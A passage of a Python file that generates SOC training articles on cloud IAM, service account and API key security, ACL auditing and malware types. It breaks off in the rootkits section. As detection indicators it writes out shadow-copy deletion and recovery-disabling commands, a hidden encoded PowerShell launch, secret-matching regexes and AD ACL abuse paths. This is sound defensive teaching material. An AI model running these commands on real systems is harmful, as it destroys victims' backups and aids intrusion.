  |
  +-- IAM Roles (assumed by users, services, or external entities)
  |     +-- Trust policy (who can assume the role)
  |     +-- Permission policy (what the role can do)
  |
  +-- IAM Policies (JSON permission documents)
        +-- AWS Managed Policies (predefined by AWS)
        +-- Customer Managed Policies (your custom policies)
        +-- Inline Policies (embedded in user/group/role)
```

### AWS IAM Policy Structure

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadOnly",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::security-logs",
        "arn:aws:s3:::security-logs/*"
      ],
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "10.0.0.0/8"
        },
        "Bool": {
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    },
    {
      "Sid": "DenyDeleteLogs",
      "Effect": "Deny",
      "Action": "s3:DeleteObject",
      "Resource": "arn:aws:s3:::security-logs/*"
    }
  ]
}
```

### AWS Investigation Commands

```bash
# List all IAM users
aws iam list-users --query "Users[*].[UserName,CreateDate,PasswordLastUsed]" --output table

# Check user's permissions (all attached policies)
aws iam list-attached-user-policies --user-name suspicious-user
aws iam list-user-policies --user-name suspicious-user  # inline policies

# Find users with console access but no MFA
aws iam generate-credential-report
aws iam get-credential-report --output json | jq -r '.Content' | base64 -d | \
  csvtool col 1,4,8 - | grep "true.*false"
# Columns: user, password_enabled, mfa_active

# List access keys and their last usage
aws iam list-access-keys --user-name suspicious-user
aws iam get-access-key-last-used --access-key-id AKIA...

# Check for overprivileged roles
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123456789012:user/analyst \
  --action-names "s3:*" "ec2:*" "iam:*"

# CloudTrail: find actions by a specific user
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=suspicious-user \
  --start-time 2025-01-01T00:00:00Z --max-results 50
```

## Azure IAM (Azure RBAC + Entra ID)

### Azure IAM Architecture

```
Azure AD (Entra ID) Tenant
  |
  +-- Users (human identities)
  +-- Groups (security and M365 groups)
  +-- Service Principals (app identities)
  +-- Managed Identities (Azure-managed service identities)
  |     +-- System-assigned (tied to specific resource)
  |     +-- User-assigned (reusable across resources)
  |
  +-- Role Definitions
  |     +-- Built-in Roles (Owner, Contributor, Reader, etc.)
  |     +-- Custom Roles
  |
  +-- Role Assignments
        +-- Principal (who) + Role (what) + Scope (where)
        +-- Scope: Management Group > Subscription > Resource Group > Resource
```

### Azure RBAC Key Roles

| Role | Permissions | Risk Level |
|------|------------|------------|
| Owner | Full control + assign roles | Critical |
| Contributor | Full control except role assignment | High |
| Reader | View only | Low |
| User Access Administrator | Manage role assignments only | Critical |
| Global Administrator (Entra) | Full control of Azure AD tenant | Critical |
| Security Administrator (Entra) | Manage security settings | High |
| Security Reader (Entra) | Read security information | Low |

### Azure Investigation Commands

```powershell
# List all role assignments at subscription level
Get-AzRoleAssignment | Select DisplayName, RoleDefinitionName, Scope |
    Sort RoleDefinitionName

# Find all Owner role assignments (highest privilege)
Get-AzRoleAssignment -RoleDefinitionName "Owner" |
    Select DisplayName, ObjectType, Scope

# Check specific user's role assignments
Get-AzRoleAssignment -SignInName "jane@contoso.com" |
    Select RoleDefinitionName, Scope

# List service principals with high-privilege roles
Get-AzRoleAssignment | Where { $_.ObjectType -eq "ServicePrincipal" -and
    $_.RoleDefinitionName -in @("Owner","Contributor","User Access Administrator") } |
    Select DisplayName, RoleDefinitionName, Scope

# Azure AD sign-in logs (last 7 days)
Get-AzureADAuditSignInLogs -Filter "createdDateTime ge 2025-01-08" -Top 100 |
    Select UserPrincipalName, AppDisplayName, IPAddress, Status
```

## GCP IAM

### GCP IAM Architecture

```
Google Cloud Organization
  |
  +-- Folders (organizational grouping)
  |     +-- Projects (resource containers)
  |           +-- Resources (VMs, buckets, databases)
  |
  +-- IAM Policy Bindings
        +-- Member (who) + Role (what) + Resource (where)
        +-- Roles: Predefined, Basic, or Custom

Members:
  user:jane@contoso.com          (Google account)
  group:soc-team@contoso.com     (Google group)
  serviceAccount:app@proj.iam.gserviceaccount.com
  domain:contoso.com             (all users in domain)
  allAuthenticatedUsers          (DANGEROUS: any Google account)
  allUsers                       (DANGEROUS: anyone on internet)
```

### GCP IAM Roles

```
Basic Roles (legacy, overly broad):
  roles/viewer    = Read access to all resources
  roles/editor    = Read + write to all resources
  roles/owner     = Full control including IAM management

Predefined Roles (service-specific, recommended):
  roles/storage.objectViewer     = Read GCS objects
  roles/compute.instanceAdmin.v1 = Manage Compute instances
  roles/logging.viewer           = Read Cloud Logging

Custom Roles (fine-grained):
  Organization or project level
  Specify exact permissions needed
```

### GCP Investigation Commands

```bash
# List IAM policy bindings for a project
gcloud projects get-iam-policy my-project --format=json

# Find all users with Owner role
gcloud projects get-iam-policy my-project --flatten="bindings[].members" \
  --filter="bindings.role:roles/owner" --format="table(bindings.members)"

# List service accounts
gcloud iam service-accounts list --project=my-project

# Check service account keys (long-term credentials)
gcloud iam service-accounts keys list --iam-account=app@my-project.iam.gserviceaccount.com

# Audit logs: find admin activity
gcloud logging read 'logName="projects/my-project/logs/cloudaudit.googleapis.com%2Factivity"' \
  --limit=50 --format=json

# Find publicly accessible resources
gcloud asset search-all-iam-policies --query="policy:allUsers OR policy:allAuthenticatedUsers" \
  --scope=projects/my-project
```

## Cross-Account and Cross-Project Access

| Pattern | AWS | Azure | GCP |
|---------|-----|-------|-----|
| Cross-account role | AssumeRole with external ID | Lighthouse / B2B guest | Cross-project IAM binding |
| Shared resource | Resource-based policy | Shared access signature | Shared VPC, IAM binding |
| Centralized logging | Organization CloudTrail | Diagnostic settings to central workspace | Organization log sink |
| Break-glass | Root account (per account) | Global Admin (per tenant) | Organization admin |

## Security Best Practices (All Providers)

| Practice | Description |
|----------|-------------|
| No long-term keys | Use temporary credentials (roles, managed identities, workload identity) |
| Least privilege | Grant minimum permissions; use predefined/managed roles |
| Enforce MFA | Require MFA for all human access, especially privileged |
| Regular access review | Quarterly review of all IAM assignments |
| Monitor admin actions | Alert on privilege escalation, policy changes, role assignments |
| No wildcard permissions | Avoid Action: "*" or Resource: "*" in policies |
| Service account hygiene | Rotate keys, use managed identities where possible |
| Centralized logging | Enable CloudTrail, Azure Activity Log, GCP Audit Logs |
| SCPs/Guardrails | Use Organization-level policies to set permission boundaries |

## Key Takeaways

- Each cloud provider implements IAM differently but shares core concepts
- Misconfigured IAM policies are the top cause of cloud breaches
- Service identities (roles, service principals, service accounts) require the same governance as human identities
- Long-term credentials (access keys, service account keys) are high risk and should be minimized
- SOC analysts must be able to query IAM configurations across providers during investigations
- Monitor admin audit logs for privilege escalation and policy changes
"""))

    # ---------------------------------------------------------------
    # Article 15: Service Accounts and API Key Security
    # ---------------------------------------------------------------
    articles.append(("Service Accounts and API Key Security", ["identity", "access-management", "service-accounts", "api-keys", "secrets-management", "vault"], r"""# Service Accounts and API Key Security

## Overview

Service accounts are non-human identities used by applications, scripts, automation tools, and services to authenticate and interact with other systems. Unlike human accounts, service accounts typically operate without interactive login, often have elevated permissions, and their credentials tend to be long-lived and shared. This combination makes them prime targets for attackers.

SOC analysts frequently encounter service account compromise during incident investigations. Stolen API keys, leaked service account credentials in code repositories, and overprivileged service identities are among the most common findings in cloud security breaches.

## Service Account Types

| Type | Platform | Description | Credential Type |
|------|----------|-------------|-----------------|
| AD Service Account | Windows | Standard user account used by services | Password |
| Managed Service Account (MSA) | Windows | Auto-managed password, single computer | Auto-rotated password |
| Group Managed Service Account (gMSA) | Windows | Auto-managed, multiple computers | Auto-rotated, shared |
| IAM Role | AWS | Assumed by EC2, Lambda, etc. | Temporary STS token |
| Service Principal | Azure | App registration in Azure AD | Client secret or certificate |
| Managed Identity | Azure | Azure-managed, no credentials to manage | Auto-rotated token |
| Service Account | GCP | Google Cloud project-level identity | JSON key file or metadata token |

## Risks of Service Accounts

| Risk | Description | Impact |
|------|-------------|--------|
| Credential leakage | API keys committed to Git, stored in plaintext | Attacker gains system access |
| Overprivileged | More permissions than needed | Larger blast radius on compromise |
| No MFA | Service accounts cannot use interactive MFA | Single credential = full access |
| Long-lived credentials | Keys never rotated or rotated infrequently | Extended window for stolen credential use |
| Shared credentials | Multiple services share same key/password | Compromise affects all services |
| No ownership | Nobody responsible for the account | Never reviewed, never rotated, never decommissioned |
| Interactive use | Service account used for human login | Bypasses human account controls |

## Windows Managed Service Accounts

### Group Managed Service Accounts (gMSA)

```powershell
# Create a gMSA (requires AD DS schema 2012+)
# Step 1: Create KDS root key (one-time, domain-wide)
Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)

# Step 2: Create the gMSA
New-ADServiceAccount -Name "gMSA_WebApp" `
  -DNSHostName "gmsa-webapp.contoso.com" `
  -PrincipalsAllowedToRetrieveManagedPassword "WebServers" `
  -KerberosEncryptionType AES256 `
  -ServicePrincipalNames "HTTP/webapp.contoso.com"

# Step 3: Install on target servers
Install-ADServiceAccount -Identity "gMSA_WebApp"

# Step 4: Test
Test-ADServiceAccount -Identity "gMSA_WebApp"
# Returns True if working correctly

# Benefits of gMSA:
# - Password automatically managed by AD (120-char, rotated every 30 days)
# - No human knows the password
# - Multiple servers can use the same gMSA
# - Cannot be used for interactive login
```

### Auditing Service Accounts in AD

```powershell
# Find all service accounts (by naming convention or OU)
Get-ADUser -Filter 'Name -like "svc_*"' -Properties LastLogonTimestamp, `
    PasswordLastSet, PasswordNeverExpires, ServicePrincipalName |
    Select Name, SamAccountName,
        @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}},
        PasswordLastSet, PasswordNeverExpires,
        @{N='SPNs';E={$_.ServicePrincipalName -join '; '}}

# Find service accounts with password never expires (risk)
Get-ADUser -Filter {PasswordNeverExpires -eq $true -and Name -like "svc_*"} |
    Select Name, SamAccountName

# Find service accounts that have logged on interactively
# (Event ID 4624 with logon type 2 or 10 for service accounts)
```

## API Key Management

### API Key Lifecycle

```
Secure API Key Lifecycle:

1. GENERATION
   - Generate cryptographically random key (256-bit minimum)
   - Associate with specific service/application identity
   - Set expiration date (90 days maximum)
   - Define scope (minimum required permissions)

2. STORAGE
   - Store in secrets management system (Vault, AWS Secrets Manager)
   - Never in source code, config files, or environment variables on disk
   - Encrypt at rest
   - Access logged and audited

3. DISTRIBUTION
   - Inject at runtime (environment variable, mounted secret)
   - Never transmit via email, chat, or tickets
   - Use short-lived tokens where possible

4. ROTATION
   - Automated rotation on schedule (30-90 days)
   - Immediate rotation on suspected compromise
   - Support dual-key period (old and new both valid briefly)

5. REVOCATION
   - Immediate revocation capability
   - Verify revocation is effective (test that old key fails)
   - Log revocation event

6. MONITORING
   - Alert on usage from unexpected IPs/regions
   - Alert on usage outside normal patterns
   - Alert on failed authentication attempts
   - Regular audit of all active keys
```

### Detecting Leaked API Keys

```bash
# Git history scanning for secrets
# Using truffleHog
trufflehog git https://github.com/org/repo --only-verified

# Using gitleaks
gitleaks detect --source=/path/to/repo --verbose

# Common patterns to search for:
# AWS Access Key:     AKIA[0-9A-Z]{16}
# AWS Secret Key:     [0-9a-zA-Z/+=]{40}
# Azure Client Secret: [a-zA-Z0-9~._-]{34}
# GCP Service Account: "type": "service_account"
# Generic API Key:    [aA][pP][iI]_?[kK][eE][yY].*['"][0-9a-zA-Z]{20,}['"]

# GitHub secret scanning (built-in)
# Automatically detects and alerts on committed secrets
# Configure: Settings > Code security and analysis > Secret scanning

# Pre-commit hook to prevent secret commits
# .pre-commit-config.yaml
# repos:
#   - repo: https://github.com/gitleaks/gitleaks
#     hooks:
#       - id: gitleaks
```

## Secrets Management Systems

| Tool | Type | Key Features |
|------|------|-------------|
| HashiCorp Vault | Self-hosted/Cloud | Dynamic secrets, encryption as a service, PKI |
| AWS Secrets Manager | AWS native | Auto-rotation, RDS integration, cross-account |
| AWS SSM Parameter Store | AWS native | Free tier, hierarchical, less rotation features |
| Azure Key Vault | Azure native | Certificates, keys, secrets, HSM-backed |
| GCP Secret Manager | GCP native | Auto-replication, IAM-based access, versioning |
| CyberArk Conjur | Enterprise | Container-native, Kubernetes integration |
| Doppler | Cloud | Multi-environment, sync to platforms |

### HashiCorp Vault Usage

```bash
# Store a secret
vault kv put secret/myapp/db username=appuser password=SuperSecret123

# Read a secret
vault kv get secret/myapp/db

# Generate dynamic database credentials (auto-expired)
vault read database/creds/readonly
# Returns: username=v-token-readonly-abc123, password=randomABC...
# Credentials auto-expire after TTL (e.g., 1 hour)
# No long-lived database passwords to steal

# Application authentication with AppRole
vault write auth/approle/login \
  role_id="db02de05-fa39-..." \
  secret_id="6a174c20-f6de-..."

# Kubernetes integration: inject secrets as volumes
# Pod spec:
#   serviceAccountName: myapp
#   volumes:
#     - name: vault-secrets
#       csi:
#         driver: secrets-store.csi.k8s.io
#         readOnly: true
#         volumeAttributes:
#           secretProviderClass: vault-myapp
```

### AWS Secrets Manager with Rotation

```python
import boto3
import json

# Retrieve a secret
client = boto3.client('secretsmanager', region_name='us-east-1')
response = client.get_secret_value(SecretId='prod/myapp/db-credentials')
secret = json.loads(response['SecretString'])
db_password = secret['password']

# Enable automatic rotation (every 30 days)
client.rotate_secret(
    SecretId='prod/myapp/db-credentials',
    RotationLambdaARN='arn:aws:lambda:us-east-1:123456789012:function:SecretsRotation',
    RotationRules={'AutomaticallyAfterDays': 30}
)
```

## Key Rotation Best Practices

| Credential Type | Rotation Frequency | Method |
|----------------|-------------------|--------|
| API keys | 90 days or less | Automated via secrets manager |
| Service account passwords | 30-60 days | gMSA or automated rotation |
| Database credentials | Use dynamic/ephemeral | Vault dynamic secrets |
| TLS certificates | Before expiry (automate) | ACME/Let's Encrypt or PKI |
| SSH keys | 90 days or use certificates | SSH CA with short-lived certs |
| Cloud access keys | Avoid entirely | Use IAM roles/managed identities |

## SOC Analyst Investigation Guide

```
Service Account Compromise Indicators:

1. Service account used from unexpected IP or region
2. Service account API calls outside normal patterns
3. Service account accessing resources it normally does not
4. Multiple failed authentication attempts for service account
5. Service account used during non-operational hours
6. New API key created for existing service account
7. Service account added to privileged group
8. Service account credentials found in public repository

Investigation Steps:
1. Identify scope: which systems does this service account access?
2. Review authentication logs: where was it used from?
3. Check for credential exposure: was the key committed to code?
4. Assess blast radius: what could an attacker do with this access?
5. Revoke and rotate: immediately revoke compromised credentials
6. Audit usage: review all actions taken with the compromised identity
7. Contain: block the attacker's access path
8. Remediate: fix the root cause (leaked key, overprivileged account)
```

## Key Takeaways

- Service accounts are high-value targets because they often have elevated, unmonitored access
- Use managed service accounts (gMSA, managed identities, IAM roles) instead of static credentials
- Never store secrets in source code, config files, or environment variables on disk
- Implement automated key rotation through secrets management platforms
- Monitor service account usage patterns and alert on anomalies
- SOC analysts should treat service account compromise as high-priority incidents
"""))

    # ---------------------------------------------------------------
    # Article 16: Access Control Lists and Permissions Auditing
    # ---------------------------------------------------------------
    articles.append(("Access Control Lists and Permissions Auditing", ["identity", "access-management", "acl", "permissions", "ntfs", "auditing", "active-directory"], r"""# Access Control Lists and Permissions Auditing

## Overview

Access Control Lists (ACLs) are the fundamental mechanism for defining who can access what resources and with which permissions. ACLs exist across multiple domains: file systems (NTFS, ext4), network devices (firewall rules, router ACLs), Active Directory objects, and cloud resources. Understanding ACLs and how to audit them is essential for SOC analysts investigating unauthorized access, detecting privilege escalation, and ensuring compliance.

## Types of ACLs

| ACL Type | Domain | Purpose | Example |
|----------|--------|---------|---------|
| Filesystem ACL | NTFS, POSIX | Control file and folder access | User read/write on C:\Reports |
| Network ACL | Routers, firewalls | Control network traffic flow | Allow TCP 443 from 10.0.0.0/8 |
| AD Object ACL | Active Directory | Control who can modify AD objects | Helpdesk can reset passwords in OU |
| Cloud IAM | AWS/Azure/GCP | Control cloud resource access | Role binding on S3 bucket |
| Database ACL | SQL Server, Oracle | Control database operations | GRANT SELECT ON table TO user |

## NTFS Permissions Deep Dive

### NTFS Permission Types

| Permission | File | Folder | Includes |
|-----------|------|--------|----------|
| Full Control | Everything | Everything | All below + change permissions + take ownership |
| Modify | Read + Write + Execute + Delete | Same for contents | Does not include change permissions |
| Read & Execute | Read + Execute | List + Read + Execute for contents | Traverse folder |
| List Folder Contents | N/A | List contents only | Only applies to folders |
| Read | View contents + attributes | List contents | View but not modify |
| Write | Modify contents + attributes | Create files/folders | Cannot delete existing |

### DACL and SACL

```
Every NTFS object has a Security Descriptor containing:

+-- Security Descriptor
    |
    +-- Owner SID (who owns the object)
    |
    +-- DACL (Discretionary Access Control List)
    |     Controls WHO can access the object and HOW
    |     Contains Access Control Entries (ACEs):
    |       - Allow ACE: grants specific permissions to a principal
    |       - Deny ACE: explicitly denies permissions to a principal
    |     Evaluation order: Deny ACEs are checked first
    |
    +-- SACL (System Access Control List)
          Controls AUDITING of access to the object
          Defines which access attempts generate audit log entries
          Requires SeSecurityPrivilege to view/modify
```

### Viewing and Modifying NTFS Permissions

```powershell
# View NTFS permissions
Get-Acl C:\SensitiveData | Format-List

# Detailed ACL view
(Get-Acl C:\SensitiveData).Access | Format-Table IdentityReference, `
    FileSystemRights, AccessControlType, IsInherited -AutoSize

# Using icacls (command-line)
icacls C:\SensitiveData
# Output example:
# C:\SensitiveData BUILTIN\Administrators:(OI)(CI)(F)
#                  CONTOSO\SOC-Analysts:(OI)(CI)(R)
#                  CONTOSO\Domain Admins:(OI)(CI)(F)
#
# (OI) = Object Inherit    (applies to files in folder)
# (CI) = Container Inherit (applies to subfolders)
# (F)  = Full Control
# (R)  = Read
# (M)  = Modify
# (W)  = Write

# Grant permissions
icacls C:\SensitiveData /grant "CONTOSO\SOC-Engineers:(OI)(CI)(M)"

# Remove permissions
icacls C:\SensitiveData /remove "CONTOSO\Interns"

# Deny permissions (explicit deny)
icacls C:\SensitiveData /deny "CONTOSO\Contractors:(OI)(CI)(W)"

# Reset permissions to inherited defaults
icacls C:\SensitiveData /reset /t

# Save ACLs to file (for backup or comparison)
icacls C:\SensitiveData /save C:\temp\acl_backup.txt /t

# Restore ACLs from backup
icacls C:\ /restore C:\temp\acl_backup.txt
```

## Effective Permissions

Effective permissions are the actual permissions a user has on a resource, calculated from all ACEs that apply to the user (directly and through group memberships).

```
Effective Permission Calculation:

1. Gather all ACEs that apply to the user:
   - Direct user ACEs
   - ACEs for groups the user belongs to (including nested groups)
   - Inherited ACEs from parent folders

2. Apply evaluation rules:
   - Explicit Deny beats everything
   - Explicit Allow grants access
   - Inherited Deny beats inherited Allow
   - If not explicitly allowed, access is implicitly denied

3. Combine:
   All Allow permissions are combined (union)
   Then all Deny permissions are subtracted

Example:
  User: jane.analyst
  Groups: SOC-Analysts, All-Employees, Project-Alpha

  ACE 1: SOC-Analysts = Allow Read, Execute
  ACE 2: Project-Alpha = Allow Modify
  ACE 3: All-Employees = Deny Write (explicit)

  Effective: Read + Execute + Modify - Write
  Result: Read + Execute (Modify includes Write, which is denied)
```

### Checking Effective Permissions

```powershell
# Using Sysinternals AccessChk (best method)
accesschk.exe -u jane.analyst C:\SensitiveData

# Windows GUI: Security tab > Advanced > Effective Access > select user

# Check if inheritance is enabled on a folder
(Get-Acl C:\Data\Restricted).AreAccessRulesProtected
# True = inheritance disabled, False = inheritance enabled

# Disable inheritance (keep existing ACEs as explicit copies)
$acl = Get-Acl C:\Data\Restricted
$acl.SetAccessRuleProtection($true, $true)  # protect=true, copy=true
Set-Acl C:\Data\Restricted $acl
```

## Permission Inheritance

```
Inheritance Flow:

C:\Data                        (Admins: Full Control, Users: Read)
  +-- C:\Data\Reports          (inherits parent permissions)
  |     +-- C:\Data\Reports\Q4  (inherits + Finance: Modify added explicitly)
  +-- C:\Data\Restricted        (inheritance BROKEN)
        Admins: Full Control (explicit only)
        Security-Team: Read (explicit only)
        Users: Read is NOT inherited because inheritance is disabled
```

## Active Directory Object ACLs

AD objects have their own ACLs that control who can read, modify, or delete directory objects.

```powershell
# View AD object permissions
(Get-Acl "AD:\CN=Jane Analyst,OU=SOC,DC=contoso,DC=com").Access |
    Where { $_.ActiveDirectoryRights -match "Write|GenericAll|GenericWrite" } |
    Select IdentityReference, ActiveDirectoryRights, ObjectType |
    Format-Table -AutoSize

# Find who can modify a specific group (privilege escalation risk)
(Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=contoso,DC=com").Access |
    Where { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|WriteDacl" } |
    Select IdentityReference, ActiveDirectoryRights

# Find who has GenericAll on the domain object (complete control)
(Get-Acl "AD:\DC=contoso,DC=com").Access |
    Where { $_.ActiveDirectoryRights -match "GenericAll" } |
    Select IdentityReference, ActiveDirectoryRights

# AD ACL attacks to monitor:
# - WriteDacl: can modify ACL (grant themselves more permissions)
# - WriteOwner: can take ownership (then modify ACL)
# - GenericAll: full control of the object
# - GenericWrite: modify most attributes
# - WriteSPN: set ServicePrincipalName (enable Kerberoasting)
# - WriteAccountRestrictions: modify logon restrictions
```

### Dangerous AD ACL Configurations

| ACL Right | On Object | Attack |
|-----------|-----------|--------|
| GenericAll | User | Reset password, modify attributes |
| GenericAll | Group | Add self to group (privilege escalation) |
| GenericAll | Computer | Perform resource-based constrained delegation |
| WriteDacl | Any | Grant self any permission |
| WriteOwner | Any | Take ownership, then modify ACL |
| ForceChangePassword | User | Reset password without knowing current |
| AddMember | Group | Add arbitrary user to privileged group |

## Network ACLs

```
Firewall / Router ACL Example (Cisco-style):

access-list 100 deny   tcp any host 10.0.1.50 eq 3389 log
access-list 100 permit tcp 10.0.10.0/24 10.0.1.0/24 eq 443
access-list 100 permit tcp 10.0.10.0/24 10.0.1.0/24 eq 22
access-list 100 deny   ip any any log

Explanation:
  Line 1: Block RDP to server 10.0.1.50 from anywhere, log attempts
  Line 2: Allow HTTPS from user subnet to server subnet
  Line 3: Allow SSH from user subnet to server subnet
  Line 4: Deny and log everything else (implicit deny made explicit for logging)

Cloud Network ACLs (AWS Security Group example):

| Type    | Protocol | Port   | Source        | Description            |
|---------|----------|--------|---------------|------------------------|
| Inbound | TCP      | 443    | 10.0.0.0/8    | HTTPS from corporate   |
| Inbound | TCP      | 22     | 10.0.10.0/24  | SSH from admin subnet  |
| Outbound| TCP      | 443    | 0.0.0.0/0     | HTTPS to internet      |
| Outbound| TCP      | 53     | 10.0.0.2/32   | DNS to internal server |
```

## Permissions Auditing

### Enabling NTFS Auditing via GPO

```
Computer Configuration > Policies > Windows Settings > Security Settings
  > Advanced Audit Policy Configuration > Object Access

Enable:
  - File System: Success, Failure
  - Handle Manipulation: Success (for detailed tracking)

Then configure SACL on the target folder:
  1. Right-click folder > Properties > Security > Advanced > Auditing
  2. Add auditing entry:
     Principal: Everyone (or specific group)
     Type: Success/Failure
     Applies to: This folder, subfolders and files
     Permissions: Write, Delete, Change permissions, Take ownership
```

### Finding Overprivileged Accounts

```powershell
# Find users with admin access to file shares
$shares = Get-SmbShare | Where { $_.Name -notmatch '^\$' }
foreach ($share in $shares) {
    $acl = Get-Acl $share.Path
    $fullControl = $acl.Access | Where {
        $_.FileSystemRights -match "FullControl" -and
        $_.IdentityReference -notmatch "BUILTIN\\Administrators|NT AUTHORITY"
    }
    if ($fullControl) {
        Write-Output "Share: $($share.Name) - Path: $($share.Path)"
        $fullControl | Select IdentityReference, FileSystemRights
    }
}

# Find AD users who can modify GPOs
Get-GPO -All | ForEach-Object {
    $gpo = $_
    Get-GPPermission -Guid $gpo.Id -All |
        Where { $_.Permission -match "Edit" -and
                $_.Trustee.Name -notmatch "Domain Admins|Enterprise Admins" } |
        Select @{N='GPO';E={$gpo.DisplayName}}, Trustee, Permission
}

# Find non-standard permissions on privileged AD groups
$privGroups = @("Domain Admins","Enterprise Admins","Schema Admins",
                "Administrators","Account Operators")
foreach ($group in $privGroups) {
    $dn = (Get-ADGroup $group).DistinguishedName
    $acl = Get-Acl "AD:\$dn"
    $acl.Access | Where {
        $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|WriteProperty" -and
        $_.IdentityReference -notmatch "NT AUTHORITY|BUILTIN|S-1-5-32"
    } | Select @{N='Group';E={$group}}, IdentityReference, ActiveDirectoryRights
}
```

### Automated Permission Auditing

```
# Splunk: NTFS permission changes
index=windows EventCode=4670
| table _time, ObjectName, SubjectUserName, ProcessName

# Splunk: file access auditing
index=windows EventCode=4663
| stats count by ObjectName, SubjectUserName, AccessMask
| where AccessMask IN ("0x2","0x10000","0x40000")
# 0x2=WriteData, 0x10000=Delete, 0x40000=WriteDac

# Regular audit schedule:
# Weekly:  Scan for new SUID/SGID binaries, world-writable files
# Monthly: Review privileged group memberships, admin share permissions
# Quarterly: Full AD ACL audit, network ACL review
# Annually: Comprehensive access certification for all systems
```

## Key Takeaways

- ACLs exist across filesystems, networks, AD, and cloud resources; each domain has different syntax but similar concepts
- NTFS effective permissions are calculated from direct and group ACEs with deny taking precedence
- AD object ACLs are a critical attack surface: WriteDacl and GenericAll enable privilege escalation
- Permission inheritance simplifies management but broken inheritance can create blind spots
- Regular permission auditing detects overprivileged accounts and unauthorized access paths
- SOC analysts must audit ACLs during investigations to determine what an attacker could access and how they escalated privileges
"""))

    return articles


def threats_attacks_articles():
    """Return 18 threats, attacks, and vulnerabilities articles for the SOC analyst knowledge base."""
    articles = []

    # ------------------------------------------------------------------
    # 1. Malware Types
    # ------------------------------------------------------------------
    articles.append((
        "Malware Types Viruses Worms Trojans Ransomware Rootkits",
        ["threats", "malware", "viruses", "worms", "trojans", "ransomware", "rootkits", "detection"],
        r"""# Malware Types: Viruses, Worms, Trojans, Ransomware, and Rootkits

## Overview

Malware (malicious software) is any program designed to damage, disrupt, or gain
unauthorized access to systems. Understanding malware taxonomy is critical for SOC
analysts because detection strategies, containment procedures, and remediation steps
differ significantly across malware families.

## Malware Taxonomy

| Type | Propagation | Requires Host | Self-Replicating | Primary Goal |
|------|------------|---------------|-----------------|--------------|
| Virus | Infected files | Yes | Yes (with host) | Damage / persistence |
| Worm | Network / exploits | No | Yes (autonomous) | Spread / resource consumption |
| Trojan | Social engineering | No | No | Backdoor / data theft |
| Ransomware | Phishing / exploits | No | Varies | Extortion |
| Rootkit | Exploit / bundled | No | No | Stealth persistence |

## Viruses

A virus attaches to a legitimate file or program and executes when the host runs.

**Sub-types:**
- **Boot sector virus** - Infects MBR/VBR; executes before OS loads
- **File infector** - Attaches to .exe, .dll, .scr files
- **Macro virus** - Embedded in Office documents (VBA macros)
- **Polymorphic virus** - Changes its code signature each replication
- **Metamorphic virus** - Completely rewrites itself between infections

**Real-world examples:**
- ILOVEYOU (2000) - VBScript macro worm/virus hybrid
- CIH/Chernobyl (1998) - Overwrote BIOS firmware
- Sality - Polymorphic file infector active since 2003

**Detection indicators:**
```
# File hash changes on known-good executables
# Unexpected file size increases
# AV alerts on signature matches
# Yara rule example for macro virus detection
rule Macro_Virus_Indicators {
    strings:
        $a = "AutoOpen" nocase
        $b = "Document_Open" nocase
        $c = "Shell" nocase
        $d = "WScript" nocase
    condition:
        uint32(0) == 0xE011CFD0 and 2 of ($a, $b, $c, $d)
}
```

## Worms

Worms self-replicate across networks without user interaction, exploiting
vulnerabilities or misconfigurations to spread autonomously.

**Propagation methods:**
- Network share enumeration (SMB, NFS)
- Exploitation of unpatched services
- Email attachment auto-execution
- USB/removable media (autorun)

**Real-world examples:**
- **WannaCry (2017)** - EternalBlue SMB exploit, encrypted files, $300 Bitcoin ransom
- **NotPetya (2017)** - Mimikatz + EternalBlue, wiped MBR disguised as ransomware
- **Conficker (2008)** - MS08-067, infected millions of systems
- **Stuxnet (2010)** - USB propagation, targeted Iranian centrifuges

**Detection indicators:**
```
# Rapid increase in SMB/445 connections from single host
# Spike in DNS queries or failed connection attempts
# Sysmon Event ID 3 - unusual outbound connections
# Example Suricata rule for SMB scanning
alert tcp any any -> any 445 (msg:"Possible SMB Worm Scanning";
    flow:to_server,established; threshold:type both, track by_src,
    count 50, seconds 10; sid:1000001; rev:1;)
```

## Trojans

Trojans disguise themselves as legitimate software to trick users into execution.
They do not self-replicate but often serve as initial access for further payloads.

**Sub-types:**
- **RAT (Remote Access Trojan)** - Provides full remote control (DarkComet, njRAT, Quasar)
- **Banking Trojan** - Steals financial credentials (Emotet, TrickBot, Dridex)
- **Downloader/Dropper** - Fetches additional malware stages
- **Info-stealer** - Exfiltrates credentials, cookies, keys (RedLine, Raccoon)
- **Keylogger** - Records keystrokes

**Detection indicators:**
```
# Unexpected outbound connections to C2 servers
# Sysmon Event ID 1 - suspicious process creation chains
# Example: PowerShell downloading and executing payload
EventID: 1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell -ep bypass -w hidden -enc <base64>
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
```

## Ransomware

Ransomware encrypts files or locks systems and demands payment for recovery.
Modern ransomware uses double/triple extortion: encrypt + exfiltrate + DDoS.

**Attack stages:**
1. Initial access (phishing, RDP brute force, VPN exploit)
2. Lateral movement and privilege escalation
3. Disable security tools and backups
4. Data exfiltration (double extortion)
5. Encryption deployment across network
6. Ransom note delivery

**Major families:**
| Family | First Seen | Notable Traits |
|--------|-----------|----------------|
| LockBit | 2019 | RaaS, fastest encryption, bug bounty |
| BlackCat/ALPHV | 2021 | Rust-based, cross-platform |
| Conti | 2020 | Leaked playbook, disbanded 2022 |
| REvil/Sodinokibi | 2019 | Supply chain attacks (Kaseya) |
| Cl0p | 2019 | MOVEit, GoAnywhere mass exploitation |

**Detection indicators:**
```
# Mass file rename operations (entropy change in extensions)
# Volume Shadow Copy deletion
vssadmin.exe delete shadows /all /quiet
wmic shadowcopy delete
# Ransomware note creation across directories
# bcdedit /set {default} recoveryenabled No
# Unusual encryption library loading (advapi32.dll CryptEncrypt calls)
```

## Rootkits

Rootkits modify the operating system to hide malicious activity. They operate
